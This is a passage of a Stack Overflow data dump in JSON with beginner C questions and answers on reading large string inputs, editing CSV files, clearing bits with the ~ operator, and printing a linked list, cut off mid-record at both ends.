84590671, "body": "I am new in programming. I am trying solve a program in which test cases can have input strings  up to 200000 and each can have length of 500000. So I am trying to store them in a character array."}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 1, "creation_date": 1518634335, "post_id": 48794157, "comment_id": 84590698, "body": "So... are you sure you need to store all of these <i>in the same time</i>? I really doubt it. Each test case is processed in it&#39;s own turn."}], "answers": [{"tags": [], "owner": {"reputation": 395, "user_id": 8842262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e1baccf9211f521d4bd0cf02bef8ce31?s=128&d=identicon&r=PG&f=1", "display_name": "Miradil Zeynalli", "link": "https://stackoverflow.com/users/8842262/miradil-zeynalli"}, "is_accepted": false, "score": 0, "last_activity_date": 1518635731, "last_edit_date": 1518635731, "creation_date": 1518634416, "answer_id": 48794283, "question_id": 48794157, "link": "https://stackoverflow.com/questions/48794157/taking-large-character-array-as-input-in-c/48794283#48794283", "title": "Taking large character array as input in c", "body": "<p>After declaring an array, you can use <a href=\"http://www.cplusplus.com/reference/cstdlib/calloc/\" rel=\"nofollow noreferrer\"><code>calloc</code></a> function in order to give size to your array. So your code will approximately look like this:</p>\n\n<pre><code>char** array;\narray = calloc(c, sizeof(char*));\n</code></pre>\n\n<p>And there is no need, for defining second value, as it will change autimatically. But if you still want, you can write:</p>\n\n<pre><code>for (int i = 0; i &lt; c; i++)\n    array[i] = calloc(d, sizeof(char));\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "is_accepted": false, "score": 0, "last_activity_date": 1518636261, "last_edit_date": 1518636261, "creation_date": 1518635914, "answer_id": 48794649, "question_id": 48794157, "link": "https://stackoverflow.com/questions/48794157/taking-large-character-array-as-input-in-c/48794649#48794649", "title": "Taking large character array as input in c", "body": "<blockquote>\n  <p>Taking large size character array as input in c ...<br>\n   Is there any way in C programming language to take input such a character array?</p>\n</blockquote>\n\n<p>If code <em>truly</em> needs to retain all c &lt;= 200000 test cases at once ...</p>\n\n<p>Yes, read in each <em>line</em>, one at a time and then allocate per its length.  There is certainly little need for a <code>char array[200000][500000]</code> array.  Use an array of <code>char *</code> pointers instead.</p>\n\n<pre><code>#define c_MAX  200000\n#define d_MAX  500000\n\n// Allocate pointer array and a single buffer for reading the lines\nchar **array = malloc(sizeof *array * c_MAX); \nif (array == NULL) Handle_OutOfMemory();\nchar *buffer = malloc(sizeof *buffer * (d_MAX + 3));  // Add room for 1 extra, \\n, \\0\nif (buffer == NULL) Handle_OutOfMemory();\n\nsize_t c_count = 0;\nwhile (fgets(buffer, d_MAX + 3, stdin)) {\n  if (c_count &gt;= c_MAX) Handle_too_many_lines();\n  size_t len = strlen(buffer);\n\n  // lop off potential \\n\n  if (len &gt; 0 &amp;&amp; buffer[len-1] == '\\n') {  // lop off potential \\n\n    buffer[--len] = '\\0';\n  }\n  if (len &gt; d_MAX) Handle_too_long_a_line();\n\n  // Make a copy \n  size_t sz = sizeof array[c_count][0] * (len + 1);\n  array[c_count] = malloc(sz);\n  if (array[c_count] == NULL) Handle_OutOfMemory();\n  memcpy(array[c_count], buffer, sz);\n  c_count++;\n}\nfree(buffer);\n\n// TBD code\n// Right-size `array` if desired with realloc()\n\n// Use the `c_count` elements of `array`\n\n// when done free them all\nfor (size_t i = 0; i&lt; c_count; i++) {\n  free(array[c_count]);\n}\nfree(array);\n</code></pre>\n"}], "owner": {"reputation": 1, "user_id": 9361560, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/734d9087f3f4c6abb54e8d99ebc0c356?s=128&d=identicon&r=PG&f=1", "display_name": "ShrirangKulkarni", "link": "https://stackoverflow.com/users/9361560/shrirangkulkarni"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 681, "favorite_count": 0, "answer_count": 2, "score": -4, "last_activity_date": 1536941289, "creation_date": 1518633836, "last_edit_date": 1536941289, "question_id": 48794157, "link": "https://stackoverflow.com/questions/48794157/taking-large-character-array-as-input-in-c", "title": "Taking large character array as input in c", "body": "<p>I want to take a large character array as input.<br>\nE.g.: <code>char array[c][d]</code><br>\nwhere <code>c &lt;= 200000</code> and <code>d &lt;= 500000</code>.  </p>\n\n<p>Is there any way in C programming language to take such a character array as input?</p>\n"}, {"tags": ["c", "csv"], "comments": [{"owner": {"reputation": 12179, "user_id": 1480131, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/WZPm4.jpg?s=128&g=1", "display_name": "Pablo", "link": "https://stackoverflow.com/users/1480131/pablo"}, "edited": false, "score": 0, "creation_date": 1518632786, "post_id": 48793728, "comment_id": 84589895, "body": "The task is pretty clear. Where exactly are you having trouble with?"}, {"owner": {"reputation": 610, "user_id": 8979940, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/DmzYf.jpg?s=128&g=1", "display_name": "Omer Dagan", "link": "https://stackoverflow.com/users/8979940/omer-dagan"}, "edited": false, "score": 0, "creation_date": 1518632826, "post_id": 48793728, "comment_id": 84589915, "body": "try: <a href=\"https://stackoverflow.com/questions/48755923/search-in-a-csv-file-in-c\" title=\"search in a csv file in c\">stackoverflow.com/questions/48755923/search-in-a-csv-file-in&zwnj;&#8203;-c</a>"}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1518632935, "post_id": 48793728, "comment_id": 84589968, "body": "The line <code>if (id_city != NULL)</code> cannot be <code>NULL</code> because you have defined <code>char id_city[100] = &quot;11&quot;;</code> (irrespective of the actual data). At what level are you stuck?"}, {"owner": {"reputation": 43, "user_id": 9351958, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a20190ee01336c71a4a56b78eaaf403c?s=128&d=identicon&r=PG&f=1", "display_name": "Jessijow Black", "link": "https://stackoverflow.com/users/9351958/jessijow-black"}, "reply_to_user": {"reputation": 610, "user_id": 8979940, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/DmzYf.jpg?s=128&g=1", "display_name": "Omer Dagan", "link": "https://stackoverflow.com/users/8979940/omer-dagan"}, "edited": false, "score": 0, "creation_date": 1518633113, "post_id": 48793728, "comment_id": 84590038, "body": "@Dagan: That question was mine, in fact... But I found that I can&#39;t do it that way... Maybe I&#39;ll just delete that question..."}, {"owner": {"reputation": 43, "user_id": 9351958, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a20190ee01336c71a4a56b78eaaf403c?s=128&d=identicon&r=PG&f=1", "display_name": "Jessijow Black", "link": "https://stackoverflow.com/users/9351958/jessijow-black"}, "reply_to_user": {"reputation": 12179, "user_id": 1480131, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/WZPm4.jpg?s=128&g=1", "display_name": "Pablo", "link": "https://stackoverflow.com/users/1480131/pablo"}, "edited": false, "score": 0, "creation_date": 1518633792, "post_id": 48793728, "comment_id": 84590392, "body": "@Pablo: I never worked with files before, to tell you the truth. I&#39;m in college and teachers didn&#39;t talk about files at all. I have a code that can search in the city.csv file, that is similar to the first question I asked here, and it works as I expected. I don&#39;t know how can I take the id_city from there, to use in this code, and if I can use the code I have for searching in this case. Furthermore, I&#39;m not sure if the last code lines are correct to append the information in the meteo.csv file... Sorry if I was a little confuse..."}, {"owner": {"reputation": 43, "user_id": 9351958, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a20190ee01336c71a4a56b78eaaf403c?s=128&d=identicon&r=PG&f=1", "display_name": "Jessijow Black", "link": "https://stackoverflow.com/users/9351958/jessijow-black"}, "reply_to_user": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1518634015, "post_id": 48793728, "comment_id": 84590512, "body": "@WeatherVane: I deleted the &quot;11&quot;, now that I think about it, it doesn&#39;t make sense... I explained above what my problem was to Pablo. And again, sorry if I was a little confuse..."}, {"owner": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 0, "creation_date": 1518638031, "post_id": 48793728, "comment_id": 84592670, "body": "To <i>&quot;edit&quot;</i> a file in C, you can do one of two things. 1) Read the whole file into memory, modify the file, write the file back to disk. 2) Create a temporary file. Copy the original file to the temporary file while making any changes needed. Delete the original file and rename the temporary file."}, {"owner": {"reputation": 43, "user_id": 9351958, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a20190ee01336c71a4a56b78eaaf403c?s=128&d=identicon&r=PG&f=1", "display_name": "Jessijow Black", "link": "https://stackoverflow.com/users/9351958/jessijow-black"}, "reply_to_user": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 0, "creation_date": 1518638481, "post_id": 48793728, "comment_id": 84592892, "body": "@user3386109: So the way I appended in the end of my code is wrong? How can I do that? (Sorry, as I said somewhere, I never worked with files before, and as much as I searched on the Internet, is very difficult find something useful about how to work in .csv using C...)"}, {"owner": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 0, "creation_date": 1518638934, "post_id": 48793728, "comment_id": 84593094, "body": "The problem with appending is that you didn&#39;t delete the previous weather data for the city. Which is to say that you didn&#39;t <i>&quot;edit&quot;</i> the city&#39;s weather data, you added a duplicate entry for the city. I would read the whole file into memory using <code>fgets</code> to read lines. Parse each line with <code>sscanf</code>, storing the information in an array of structures. Then modify the weather for the chosen city, and write the new data back to the file. That&#39;s the best I can do for you. Good luck."}], "answers": [{"comments": [{"owner": {"reputation": 43, "user_id": 9351958, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a20190ee01336c71a4a56b78eaaf403c?s=128&d=identicon&r=PG&f=1", "display_name": "Jessijow Black", "link": "https://stackoverflow.com/users/9351958/jessijow-black"}, "edited": false, "score": 0, "creation_date": 1518707752, "post_id": 48798746, "comment_id": 84624373, "body": "Thanks for the help! I just didn&#39;t understand, in the 3rd code, what do you mean with the function &quot;do_something_with_cities&quot;? And sorry for the inconvenience"}, {"owner": {"reputation": 12179, "user_id": 1480131, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/WZPm4.jpg?s=128&g=1", "display_name": "Pablo", "link": "https://stackoverflow.com/users/1480131/pablo"}, "reply_to_user": {"reputation": 43, "user_id": 9351958, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a20190ee01336c71a4a56b78eaaf403c?s=128&d=identicon&r=PG&f=1", "display_name": "Jessijow Black", "link": "https://stackoverflow.com/users/9351958/jessijow-black"}, "edited": false, "score": 0, "creation_date": 1518708658, "post_id": 48798746, "comment_id": 84624946, "body": "<code>do_something_with_cities</code> is just a place holder for your work with the cities array. You can do the work directly in <code>main</code> or in other function."}], "tags": [], "owner": {"reputation": 12179, "user_id": 1480131, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/WZPm4.jpg?s=128&g=1", "display_name": "Pablo", "link": "https://stackoverflow.com/users/1480131/pablo"}, "is_accepted": true, "score": 0, "last_activity_date": 1518657481, "last_edit_date": 1518657481, "creation_date": 1518657092, "answer_id": 48798746, "question_id": 48793728, "link": "https://stackoverflow.com/questions/48793728/how-to-edit-csv-files-in-c/48798746#48798746", "title": "How to edit .csv files in C", "body": "<p>The first thing I would do is encapsulate the data in a <code>struct</code>, that makes it\neasier to map a line of a CSV file into an object representing a line.</p>\n\n<p>If both files <code>city.csv</code> and <code>meteo.csv</code> have different columns, I'd create a\ndifferent <code>struct</code> for each file. If both files have the same columns, you could\nuse the <code>struct</code>. I assume that both files are different and that <code>city</code> has the\nformat <code>meteo_id,city_id,name</code>.</p>\n\n<pre><code>typedef struct city_t {\n    int meteo_id;\n    int city_id;\n    char name[100];  // no city should have\n                     // longer than 100 chars\n} city_t;\n\ntypedef struct meteo_t {\n    int meteo_id;\n    int city_id;\n    int tempt_max;\n    int tempt_mix;\n    double humidity;\n    double preassure;\n    char date[11];\n} meteo_t;\n</code></pre>\n\n<p>Let's assume that both files are well formatted, otherwise you would have to\nwrite code that checks for errors and handles them, that would be the next step\nin the exercise, so I'm going to write only the basic version with basic error\nrecognition.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;errno.h&gt;\n\n// takes 2 params, the filename and a pointer\n// to size_t where the number of cities is stored\ncity_t *read_cities(const char *filename, size_t *len)\n{\n    if(filename == NULL || len == NULL)\n        return NULL;\n\n    FILE *fp = fopen(filename, \"r\");\n    if(fp == NULL)\n    {\n        fprintf(stderr, \"Could not open %s: %s\\n\", filename, strerror(errno));\n        return NULL;\n    }\n\n    city_t *arr = NULL, *tmp;\n    *len = 0;\n\n    // assuming that no line will be longer than 1023 chars long\n    char line[1024];\n\n    while(fgets(line, sizeof line, fp))\n    {\n        tmp = realloc(arr, (*len + 1) * sizeof *arr);\n        if(tmp == NULL)\n        {\n            fprintf(stderr, \"could not parse the whole file %s\\n\", filename);\n            // returning all parsed cities so far\n\n            if(*len == 0)\n            {\n                free(arr);\n                arr = NULL;\n            }\n\n            return arr;\n        }\n\n        arr = tmp;\n\n        // %99[^\\n] is to read up to 99 characters until the end of the line\n        if(sscanf(line, \"%d,%d,%99[^\\n]\", &amp;(arr[*len].meteo_id),\n                    &amp;(arr[*len].city_id), arr[*len].name) != 3)\n        {\n            fprintf(stderr, \"Invalid line format (skipping line):\\n%s\\n\", line);\n            // skip this line, and decrement *len\n            (*len)--;\n            continue;\n        }\n\n        // incrementing only when parsing of line was OK\n        (*len)++;\n    }\n\n    fclose(fp);\n\n    // file is empty or\n    // all lines have wrong format\n    if(*len == 0)\n    {\n        free(arr);\n        arr = NULL;\n    }\n\n\n    return arr;\n}\n\nvoid print_cities(city_t *cities, size_t len, FILE *fp)\n{\n    if(cities == NULL || fp == NULL)\n        return;\n\n    for(size_t i = 0; i &lt; len; ++i)\n        fprintf(fp, \"%d,%d,%s\\n\", cities[i].meteo_id, cities[i].citiy_id,\n                cities[i].name);\n}\n</code></pre>\n\n<p>Now I've written the read and write functions for the file <code>citiy.csv</code> assuming the\nformat <code>meteo_id;city_id;name</code>. The <code>print_cities</code> allows you to print the CSV\ncontent on the screen (passing <code>stdout</code> as the last argument) or to a file\n(passing a <code>FILE</code> object as the last argument).</p>\n\n<p>You can use these functions as templates for reading and writing <code>meteo.csv</code>, the\nidea is the same.</p>\n\n<p>You can use these function as follows:</p>\n\n<pre><code>int main(void)\n{\n    size_t cities_len;\n    city_t *cities = read_cities(\"city.csv\", &amp;cities_len);\n\n    // error\n    if(cities == NULL)\n        return 1;\n\n    do_something_with_cities(cities, cities_len);\n\n    // update csv\n    FILE *fp = fopen(\"city.csv\", \"w\");\n\n    if(fp == NULL)\n    {\n        fprintf(stderr, \"Could not open city.csv for reading: %s\\n\",\n                strerror(errno));\n\n        free(cities);\n        return 1;\n    }\n\n    print_cities(cities, cities_len, fp);\n\n    fclose(fp);\n    free(cities);\n    return 0;\n}\n</code></pre>\n\n<p>Now for your exercise: write a similar function that parses <code>meteo.csv</code> (using\nmy function as a template shouldn't be that difficult) and parse both files. Now\nthat you've got them in memory, it's easy to manipulate the data (insert,\nupdate, delete). Then write the files like I did in the example and that's it.</p>\n\n<p>One last hint: how to search for a city:</p>\n\n<pre><code>// returns the index in the array or -1 on error or when not found\nint search_for_city_by_name(city_t *cities, size_t len, const char *name)\n{\n    if(cities == NULL || name == NULL)\n        return -1;\n\n    for(size_t i = 0; i &lt; len; ++i)\n        if(strcmp(name, cities[i].name) == 0)\n            return i;\n\n    // not found\n    return -1;\n}\n</code></pre>\n\n<p>Now I have given you almost all parts of the assignment, all you have to do is\nstick them together and write the same functions for the <code>meteo.csv</code> file.</p>\n"}], "owner": {"reputation": 43, "user_id": 9351958, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a20190ee01336c71a4a56b78eaaf403c?s=128&d=identicon&r=PG&f=1", "display_name": "Jessijow Black", "link": "https://stackoverflow.com/users/9351958/jessijow-black"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1127, "favorite_count": 0, "accepted_answer_id": 48798746, "answer_count": 1, "score": 1, "last_activity_date": 1518657481, "creation_date": 1518632105, "last_edit_date": 1518634640, "question_id": 48793728, "link": "https://stackoverflow.com/questions/48793728/how-to-edit-csv-files-in-c", "title": "How to edit .csv files in C", "body": "<p>I'm new at programming, and I need help in my C project. I have to search for a city, confirm it exists in the first file (city.csv), and take its id from there. Then I have to match that id with the corresponding one in the second file (meteo.csv), and then edit its weather information, that is in that second file. However, I don't know how I can take the city id from the first file, and then how to edit the second file after obtaining all the new weather informations. Here is the code:</p>\n\n<pre><code>void addInfo() {\nFILE * fp;\nchar id_city[100];    \nchar city[100];    \nchar humidity[100];    \nchar temp_max[100];    \nchar temp_min[100];\nchar pressure[100];\nchar date[100];   \n\nprintf(\"Name of the city: \");\nscanf(\"%s\", city);\n\n\n// I think it's here that I have to write the code for take the city's id from the first file\n\nif (id_city != NULL) {\n    printf(\"Maximun temperature: \");\n    scanf(\"%s\", temp_max);\n    printf(\"Minimun temperature: \");\n    scanf(\"%s\", temp_min);\n    printf(\"Humidity: \");\n    scanf(\"%s\", humidity);\n    printf(\"Pressure: \");\n    scanf(\"%s\", pressure);\n    printf(\"Date, in the format YYYY-MM-DD: \");\n    scanf(\"%s\", date);\n\n    fp = fopen (\"meteo.csv\", \"a\");\n    fprintf(fp, \"%s, %s, %s, %s, %s \\n\", temp_max, temp_min, humidity, pressure, date); //I think there's something wrong here too...\n\n    fclose(fp);\n    printf(\"Information edited successfully\");\n\n}\n</code></pre>\n\n<p>The file city.csv has 152 lines and 4 columns:</p>\n\n<pre><code>(id_city,city,county,district)\n</code></pre>\n\n<p>such as </p>\n\n<pre><code>(56,Lisbon,Lisbon,Lisbon)\n</code></pre>\n\n<p>The file meteo.csv has 152 lines and 7 columns: </p>\n\n<pre><code>(id_meteo_city,id_city,temp_max,temp_min,humidity,pressure,date) \n</code></pre>\n\n<p>such as </p>\n\n<pre><code>(56,56,14,5,62,1025,2018-02-12)\n</code></pre>\n"}, {"tags": ["c", "bit"], "comments": [{"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1518631800, "post_id": 48793622, "comment_id": 84589368, "body": "There are no &quot;negative&quot; number, just bits. Take a piece of paper and a pencil and do these operations by hand. Hello De Morgan."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1518631812, "post_id": 48793622, "comment_id": 84589378, "body": "Because to set a bit you need to OR the value with a mask having a single bit set. To reset (&quot;delete&quot;) a bit you must AND the value with a mask having all bits set <i>except</i> that bit. The <code>~</code> inverts the single-bit mask to do the AND."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1518632999, "post_id": 48793622, "comment_id": 84589990, "body": "&quot;Why Must I set the ~ operator?&quot; No, <code>~</code> is one way.   <code>y = (y |(1 &lt;&lt; n)) ^ (1 &lt;&lt; n);</code> is another.  Many ways to solve this.  Unless <code>1</code> meets the width of <code>y</code>, it is the wrong approach."}], "answers": [{"tags": [], "owner": {"reputation": 3612, "user_id": 1813336, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/1zONI.jpg?s=128&g=1", "display_name": "cleblanc", "link": "https://stackoverflow.com/users/1813336/cleblanc"}, "is_accepted": false, "score": 0, "last_activity_date": 1518631886, "creation_date": 1518631886, "answer_id": 48793677, "question_id": 48793622, "link": "https://stackoverflow.com/questions/48793622/why-must-i-use-the-operator-when-clearing-a-bit/48793677#48793677", "title": "Why must I use the ~ operator when clearing a bit?", "body": "<p>The <code>~</code> operator turns all of the 0's to 1's and all of the 1's to 0's.  In order to clear the bint in position n you want to and it will all ones and a zero in the nth position so shift a one to the nth position and <code>~</code> invert all the bits.</p>\n"}, {"tags": [], "owner": {"reputation": 12179, "user_id": 1480131, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/WZPm4.jpg?s=128&g=1", "display_name": "Pablo", "link": "https://stackoverflow.com/users/1480131/pablo"}, "is_accepted": false, "score": 0, "last_activity_date": 1518632515, "last_edit_date": 1518632515, "creation_date": 1518631917, "answer_id": 48793685, "question_id": 48793622, "link": "https://stackoverflow.com/questions/48793622/why-must-i-use-the-operator-when-clearing-a-bit/48793685#48793685", "title": "Why must I use the ~ operator when clearing a bit?", "body": "<p><code>1 &lt;&lt; n</code> for <code>n==3</code> (just an example) gives you a pattern <code>0000000...0001000</code>. <code>~</code> negates the bit\npattern to <code>11111111....11110111</code>. Using the bitwise AND operator (<code>&amp;</code>) will\nonly set the required bit to 0, all other remain with the same value. It's using\nthe fact that for a bit <code>b</code>: <code>b &amp; 1 == b</code>.</p>\n\n<p><code>~</code> flips all bits, it has nothing to do with negative numbers.</p>\n\n<p>A graphical representation for a sequence of <code>k</code>-bits</p>\n\n<pre><code>pos        k-1 k-2                           0\n          +---+---+-------------------+---+---+\n1:        | 0 | 0 |        \u00b7\u00b7\u00b7        | 0 | 1 |\n          +---+---+-------------------+---+---+\n\npos        k-1 k-2        n   n-1           0  \n          +---+---+-----+---+---+---+-----+---+\n1&lt;&lt;n      | 0 | 0 | \u00b7\u00b7\u00b7 | 1 | 0 | 0 | \u00b7\u00b7\u00b7 | 0 |\n          +---+---+-----+---+---+---+-----+---+\n\n\npos           k-1 k-2     n   n-1           0  \n          +---+---+-----+---+---+---+-----+---+\n~(1&lt;&lt;n)   | 1 | 1 | \u00b7\u00b7\u00b7 | 0 | 1 | 1 | \u00b7\u00b7\u00b7 | 1 |\n          +---+---+-----+---+---+---+-----+---+\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 673100, "user_id": 335858, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/4af3541c00d591e9a518b9c0b3b1190a?s=128&d=identicon&r=PG", "display_name": "Sergey Kalinichenko", "link": "https://stackoverflow.com/users/335858/sergey-kalinichenko"}, "is_accepted": false, "score": 1, "last_activity_date": 1518631957, "creation_date": 1518631957, "answer_id": 48793692, "question_id": 48793622, "link": "https://stackoverflow.com/questions/48793622/why-must-i-use-the-operator-when-clearing-a-bit/48793692#48793692", "title": "Why must I use the ~ operator when clearing a bit?", "body": "<p>No, <code>~</code> has nothing to do with interpreting the number as negative: tilde <code>~</code> operator interprets the number as a pattern of bits, which it then inverts (i.e. replaces zeros with ones and ones with zeros). In fact, if you apply <code>~</code> to an unsigned value, the result would remain positive.</p>\n\n<p>Recall that <code>1 &lt;&lt; k</code> expression produces a pattern of all zeros and a single <code>1</code> at the position designated by <code>k</code>. This is a bit mask that can be used to force bit at position <code>k</code> to <code>1</code> by applying OR operation.</p>\n\n<p>Now consider what happens when you apply <code>~</code> to it: all <code>0</code>s would become <code>1</code>s, and the only <code>1</code> would become zero. Hence, the result is a bit mask suitable for forcing a single bit to zero by applying AND operation.</p>\n"}, {"tags": [], "owner": {"reputation": 4268, "user_id": 5897829, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/c2c7105808cb099e98f04fe464af68c6?s=128&d=identicon&r=PG&f=1", "display_name": "Martin Verjans", "link": "https://stackoverflow.com/users/5897829/martin-verjans"}, "is_accepted": false, "score": 4, "last_activity_date": 1518632149, "creation_date": 1518632149, "answer_id": 48793743, "question_id": 48793622, "link": "https://stackoverflow.com/questions/48793622/why-must-i-use-the-operator-when-clearing-a-bit/48793743#48793743", "title": "Why must I use the ~ operator when clearing a bit?", "body": "<p>If you want to set a bit at third place from the right :</p>\n\n<pre><code>Y :            01001000\n1 &lt;&lt; 2 :       00000100\nY | (1 &lt;&lt; 2) : 01001100 The | is OR, bits are set to 1 if any is 1.\n</code></pre>\n\n<p>If you want to remove the bit :</p>\n\n<pre><code>1 &lt;&lt; 2 :         00000100\n~(1 &lt;&lt; 2) :      11111011  The ~ is NOT, bits are inversed\nY :              01001100\nY &amp; ~(1 &lt;&lt; 2) :  01001000 The &amp; is AND, bits are set to 1 if both are 1.\n</code></pre>\n\n<p>I suggest you read more about <a href=\"https://www.tutorialspoint.com/cprogramming/c_bitwise_operators.htm\" rel=\"nofollow noreferrer\">Bitwise operators</a></p>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user9268897"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 126, "favorite_count": 0, "closed_date": 1518632610, "answer_count": 4, "score": 1, "last_activity_date": 1536940858, "creation_date": 1518631620, "last_edit_date": 1536940858, "question_id": 48793622, "link": "https://stackoverflow.com/questions/48793622/why-must-i-use-the-operator-when-clearing-a-bit", "closed_reason": "Duplicate", "title": "Why must I use the ~ operator when clearing a bit?", "body": "<p>For example, if I want to set a bit in y at position n (in C)</p>\n\n<pre><code>y = y | (1 &lt;&lt; n)\n</code></pre>\n\n<p>But if I want to delete a bit in y at position n I have to use the ~ operator after binary AND.</p>\n\n<pre><code>y = y &amp; ~(1 &lt;&lt; n);\n</code></pre>\n\n<p>My question: Why Must I use the ~ operator?<br>\nIs this because the result turns into negative area?</p>\n"}, {"tags": ["c", "pointers", "linked-list"], "comments": [{"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 1, "creation_date": 1518629918, "post_id": 48793113, "comment_id": 84588426, "body": "Please <a href=\"https://stackoverflow.com/posts/48793113/edit\">edit</a> your question and post a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a> and an example of input and actual and expected output."}, {"owner": {"reputation": 5074, "user_id": 5522303, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c236ba3d52af53355a4d1a44a5145b04?s=128&d=identicon&r=PG&f=1", "display_name": "Kevin", "link": "https://stackoverflow.com/users/5522303/kevin"}, "edited": false, "score": 3, "creation_date": 1518630089, "post_id": 48793113, "comment_id": 84588516, "body": "<code>while (n != NULL) { ...} printList(n);</code> <code>n</code> will always be<code>NULL</code> after that loop (assuming it terminates)."}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 1, "creation_date": 1518630590, "post_id": 48793113, "comment_id": 84588763, "body": "<i>&quot;pls suggest some other I/O method&quot;</i>: why? What problem do you have with your I/O? But anyway, please ask only one question at a time."}, {"owner": {"reputation": 161, "user_id": 6194909, "user_type": "registered", "accept_rate": 60, "profile_image": "https://lh6.googleusercontent.com/-4I667VTlmAI/AAAAAAAAAAI/AAAAAAAABeA/AfpTaBCyGRw/photo.jpg?sz=128", "display_name": "Hank", "link": "https://stackoverflow.com/users/6194909/hank"}, "edited": false, "score": 0, "creation_date": 1518630865, "post_id": 48793113, "comment_id": 84588897, "body": "I think there should be some other format specifier used to print the pointer?"}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 1, "creation_date": 1518630976, "post_id": 48793113, "comment_id": 84588962, "body": "@vineetsagar your code does not print a pointer, it prints an <code>int</code> (<code>head-&gt;data</code> is an <code>int</code>, <code>head</code> is a pointer."}], "answers": [{"comments": [{"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": 